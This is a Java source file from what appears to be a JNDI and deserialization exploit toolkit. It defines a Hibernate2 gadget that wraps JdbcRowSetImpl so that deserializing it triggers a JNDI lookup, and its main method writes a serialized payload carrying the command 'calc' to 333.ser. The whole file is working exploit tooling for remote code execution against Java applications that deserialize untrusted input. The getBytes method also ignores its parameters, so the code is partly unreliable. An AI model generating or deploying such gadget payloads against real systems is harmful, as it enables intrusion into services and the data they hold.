package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.sun.rowset.JdbcRowSetImpl;

import java.io.FileOutputStream;

public class Hibernate2 {

    public static void main(String[] args) throws Exception {
        byte[]           bytes = getBytes(PayloadType.command, "calc");
        FileOutputStream fous  = new FileOutputStream("333.ser");
        fous.write(bytes);
        fous.close();
    }

    public static String[] getDependencies() {
        return Hibernate1.getDependencies();
    }

    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
        String command = String.valueOf(type);
        JdbcRowSetImpl rs = new JdbcRowSetImpl();
        rs.setDataSourceName(command);
        return (byte[]) Hibernate1.makeCaller(rs, Hibernate1.makeGetter(rs.getClass(), "getDatabaseMetaData"));
    }
}
